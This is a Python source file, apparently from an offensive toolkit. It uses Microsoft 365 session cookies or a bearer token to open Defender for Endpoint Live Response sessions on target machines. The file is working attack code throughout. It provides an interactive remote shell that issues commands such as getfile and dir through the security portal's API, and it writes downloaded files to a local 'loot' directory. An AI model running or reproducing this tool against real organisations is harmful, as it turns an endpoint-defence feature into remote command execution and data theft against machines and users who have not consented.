import requests
from rich import print
import getpass
import json
import time
import pathlib
import io
import re

import Authentication.Selenium

# https://learn.microsoft.com/en-us/defender-endpoint/live-response-command-examples

def SeleniumLiveResponse(username, password, sccauthtoken, xsrftoken, machineid, lootpath, useragent):
    sessionCreationInfo = None
    machineInfo = None
    currentSessionInfo = None
    machineProperty = "machineId"

    if sccauthtoken == None or xsrftoken == None:
        msscc_tokens = Authentication.Selenium.main(username, password, "security")

        sccauthtoken = msscc_tokens["sccauth"]
        xsrftoken = msscc_tokens["x-xsrf-token"]

    try:
        headers = {
            "Cookie": f"sccauth={sccauthtoken}",
            "X-Xsrf-Token":  xsrftoken,
            "Content-Type": "application/json"
        }

        if useragent:
            headers.update({"User-Agent": useragent})

        if not re.match('^\w+$', machineid):
             machineProperty = "computerDnsName"
            

        response = requests.get(f"https://security.microsoft.com/apiproxy/mtp/getMachine/machines?{machineProperty}={machineid}&IdType=SenseMachineId&readFromCache=true&lookingBackIndays=180", headers=headers)

        if response.status_code == 200:
            machineInfo = json.loads(response.content.decode("utf-8"))
        
            if isinstance(machineInfo, dict):
                data = {
                    "end_date": None,
                    "machine_id": machineInfo["MachineId"],
                    "session_status": None,
                    "start_date": None
                }

                response = requests.post("https://security.microsoft.com/apiproxy/mtp/liveResponseApi/create_session?useV3Api=true&tenantIds=undefined", headers=headers, json=data)

                if response.status_code == 200:
                    sessionCreationInfo = json.loads(response.content.decode("utf-8"))
                    
                    if isinstance(sessionCreationInfo, dict):
                        response = requests.get(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/sessions/{sessionCreationInfo['session_id']}?useV3Api=true", headers=headers)

                        if response.status_code == 200:
                            currentSessionInfo = json.loads(response.content.decode("utf-8"))

                            if isinstance(currentSessionInfo, dict):
                                print(f"""
Live Response Session Started:
[bold green][+][/bold green]: Session ID - {currentSessionInfo['session_id']}
[bold green][+][/bold green]: Hostname & ID - {currentSessionInfo['machine_info']['machine_name']} : {currentSessionInfo['machine_info']['machine_id']}
[bold green][+][/bold green]: User - {currentSessionInfo["user"]}

                                        """)

                                while True:
                                    cmd = input(f"Live Response: {currentSessionInfo['user']}:::{currentSessionInfo['machine_info']['machine_name'].split('.')[0]}> ")

                                    commandInfo = CommandParser(cmd)

                                    cmdData = {
                                        "session_id": currentSessionInfo["session_id"],
                                        "command_definition_id": commandInfo["command"],
                                        "params": commandInfo["params"],
                                        "flags": commandInfo["flags"],
                                        "raw_command_line": commandInfo["rawCommand"],
                                        "current_directory": "C:\\",
                                        "background_mode": False
                                    }

                                    if commandInfo["command"] == "exit":
                                        response = requests.post(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/close_session?useV2Api=false&useV3Api=true", headers=headers, json={'session_id': sessionCreationInfo['session_id']})
                                        
                                        if response.status_code == 200:
                                            print("[bold green][+][/bold green]: Live response session ended")
                                            
                                        exit()
                                    else:
                                        response = requests.post(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/create_command?session_id={currentSessionInfo['session_id']}&useV3Api=true", headers=headers, json=cmdData)

                                        if response.status_code == 200:
                                            cmdReciept = json.loads(response.content.decode("utf-8"))
                                            cmdResult = {"completed_on": None}
                                            
                                            if isinstance(cmdReciept, dict):
                                                while cmdResult["completed_on"] == None:
                                                    response = requests.get(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/commands/{cmdReciept['command_id']}?session_id={cmdReciept['session_id']}&useV2Api=false&useV3Api=true", headers=headers)
                                                    
                                                    if response.status_code == 200:
                                                        cmdResult = json.loads(response.content.decode("utf-8"))
                                                        
                                                        if cmdResult["completed_on"] != None:
                                                            print(cmdResult)

                                                            if "context" in cmdResult:
                                                                if "download_token" in cmdResult["context"]:
                                                                    response = requests.get(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/download_file?token={cmdResult['context']['download_token']}&session_id={cmdReciept['session_id']}&useV2Api=false&useV3Api=true", headers=headers)
                                                                    
                                                                    if response.status_code == 200:
                                                                        rawFileBytes = response.content

                                                                        safeSessionName = "".join(c for c in currentSessionInfo['session_id'] if c.isalpha() or c.isdigit() or c==' ' or c=="-").rstrip()
                                                                        safeMachineName = "".join(c for c in currentSessionInfo['machine_info']['machine_name'].split('.')[0] if c.isalpha() or c.isdigit() or c==' ').rstrip()
                                                                        fileName = pathlib.Path(commandInfo["rawCommand"].split(" ")[1]).name

                                                                        result = Extract(lootpath, safeSessionName, safeMachineName, fileName, rawFileBytes)
            
                                                                        if result:
                                                                            response = {
                                                                                "lootPath": f"{lootpath}/{safeSessionName}-{safeMachineName}/{fileName}"
                                                                            }

                                                                            print(response)
                                                    
                                                    time.sleep(3)
                        else:
                            response = "[bold red][-][/bold red] There was an error"     
        else:
            response = "[bold red][-][/bold red] There was an error"
    except Exception as e:
        response = e

        response = requests.post(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/close_session?useV2Api=false&useV3Api=true", headers=headers, json={'session_id': sessionCreationInfo['session_id']})
        if response.status_code == 200:
            print("[bold red][-][/bold red]: Live response session ended with error")
    finally:
        return response
    

def MTPLiveResponse(accesstoken, machineid, lootpath, useragent):
    sessionCreationInfo = None
    machineInfo = None
    currentSessionInfo = None
    machineProperty = None

    try:
        headers = {
            "Authorization": f"Bearer {accesstoken}",
        }

        if useragent:
            headers.update({"User-Agent": useragent})

        if not re.match('^\w+$', machineid):
             machineProperty = "computerDnsName"

        response = requests.get(f"https://m365d-inr-machineapi-prd-weu.securitycenter.windows.com/api/ine/machineapiservice/machines?{machineProperty}={machineid}&IdType=SenseMachineId&readFromCache=true&lookingBackIndays=180", headers=headers)

        if response.status_code == 200:
            machineInfo = json.loads(response.content.decode("utf-8"))
        
            if isinstance(machineInfo, dict):
                data = {
                    "end_date": None,
                    "machine_id": machineInfo["MachineId"],
                    "session_status": None,
                    "start_date": None
                }

                response = requests.post("https://mde-rsp-apilr-prd-weu.securitycenter.windows.com/api/cloud/live_response/create_session?useV3Api=true&tenantIds=undefined", headers=headers, json=data)

                if response.status_code == 200:
                    sessionCreationInfo = json.loads(response.content.decode("utf-8"))

                    if isinstance(sessionCreationInfo, dict):
                        response = requests.get(f"https://mde-rsp-apilr-prd-weu.securitycenter.windows.com/api/cloud/live_response/sessions/{sessionCreationInfo['session_id']}?useV3Api=true", headers=headers)

                        if response.status_code == 200:
                            currentSessionInfo = json.loads(response.content.decode("utf-8"))

                            if isinstance(currentSessionInfo, dict):
                                print(f"""
Live Response Session Started:
[bold green][+][/bold green]: Session ID - {currentSessionInfo['session_id']}
[bold green][+][/bold green]: Hostname & ID - {currentSessionInfo['machine_info']['machine_name']} : {currentSessionInfo['machine_info']['machine_id']}
[bold green][+][/bold green]: User - {currentSessionInfo["user"]}

                                    """)

                                while True:
                                    cmd = input(f"Live Response: {currentSessionInfo['user']}:::{currentSessionInfo['machine_info']['machine_name'].split('.')[0]}> ")

                                    commandInfo = CommandParser(cmd)

                                    cmdData = {
                                        "session_id": currentSessionInfo["session_id"],
                                        "command_definition_id": commandInfo["command"],
                                        "params": commandInfo["params"],
                                        "flags": commandInfo["flags"],
                                        "raw_command_line": commandInfo["rawCommand"],
                                        "current_directory": "C:\\",
                                        "background_mode": False
                                    }

                                    if commandInfo["command"] == "exit":
                                        response = requests.post(f"https://mde-rsp-apilr-prd-weu.securitycenter.windows.com/api/cloud/live_response/close_session?useV2Api=false&useV3Api=true", headers=headers, json={'session_id': sessionCreationInfo['session_id']})
                                        
                                        if response.status_code == 200:
                                            print("[bold green][+][/bold green]: Live response session ended")
                                            
                                        exit()
                                    else:
                                        response = requests.post(f"https://mde-rsp-apilr-prd-weu.securitycenter.windows.com/api/cloud/live_response/create_command?session_id={currentSessionInfo['session_id']}&useV3Api=true", headers=headers, json=cmdData)

                                        if response.status_code == 200:
                                            cmdReciept = json.loads(response.content.decode("utf-8"))
                                            cmdResult = {"completed_on": None}
                                            
                                            if isinstance(cmdReciept, dict):
                                                while cmdResult["completed_on"] == None:
                                                    response = requests.get(f"https://mde-rsp-apilr-prd-weu.securitycenter.windows.com/api/cloud/live_response/commands/{cmdReciept['command_id']}?session_id={cmdReciept['session_id']}&useV2Api=false&useV3Api=true", headers=headers)
                                                    
                                                    if response.status_code == 200:
                                                        cmdResult = json.loads(response.content.decode("utf-8"))
                                                        
                                                        if cmdResult["completed_on"] != None:
                                                            print(cmdResult)

                                                            if "context" in cmdResult:
                                                                if "download_token" in cmdResult["context"]:
                                                                    response = requests.get(f"https://mde-rsp-apilr-prd-weu.securitycenter.windows.com/api/cloud/live_response/download_file?token={cmdResult['context']['download_token']}&session_id={cmdReciept['session_id']}&useV2Api=false&useV3Api=true", headers=headers)
                                                                    
                                                                    if response.status_code == 200:
                                                                        rawFileBytes = response.content

                                                                        safeSessionName = "".join(c for c in currentSessionInfo['session_id'] if c.isalpha() or c.isdigit() or c==' ' or c=="-").rstrip()
                                                                        safeMachineName = "".join(c for c in currentSessionInfo['machine_info']['machine_name'].split('.')[0] if c.isalpha() or c.isdigit() or c==' ').rstrip()
                                                                        fileName = pathlib.Path(commandInfo["rawCommand"].split(" ")[1]).name

                                                                        result = Extract(lootpath, safeSessionName, safeMachineName, fileName, rawFileBytes)
            
                                                                        if result:
                                                                            response = {
                                                                                "lootPath": f"{lootpath}/{safeSessionName}-{safeMachineName}/{fileName}"
                                                                            }

                                                                            print(response)
                                                    
                                                    time.sleep(3)     
                            else:
                                response = "[bold red][-][/bold red] There was an error"
        else:
            response = "[bold red][-][/bold red] There was an error"
    except Exception as e:
        response = e

        response = requests.post(f"https://security.microsoft.com/apiproxy/mtp/liveResponseApi/close_session?useV2Api=false&useV3Api=true", headers=headers, json={'session_id': sessionCreationInfo['session_id']})
        if response.status_code == 200:
            print("[bold red][-][/bold red]: Live response session ended with error")
    finally:        
        return response


def CommandParser(command):
    commandInfo = {
        "command": None,
        "params": [],
        "flags": [],
        "rawCommand": None
    }

    commandInfo["rawCommand"] = command

    command = command.split(" ")
    commandInfo.update({"command": command[0]})
    
    for param in command[1:]:
        match commandInfo["command"]:
            case "findfile":
                commandInfo['params'].append({"param_id": "name", "value": param})
            case "cd":
                commandInfo['params'].append({"param_id": "id", "value": param})
            case "dir":
                if len(command) > 1:
                    commandInfo['params'].append({"param_id": "path", "value": param})
            case "getfile":
                commandInfo['params'].append({"param_id": "path", "value": param})
                 
    return commandInfo


def Extract(lootpath, safeSessionName, safeMachineName, fileName, rawFileBytes):
    writeSuccess = False

    try:
        pathlib.Path(f"{lootpath}{safeSessionName}-{safeMachineName}").mkdir(parents=True, exist_ok=True)
        
        with io.open(f"{lootpath}{safeSessionName}-{safeMachineName}/{fileName}", "wb") as file:
            file.write(rawFileBytes)

        writeSuccess = True
        
    except Exception as e:
        writeSuccess = False
    finally:
        return writeSuccess
    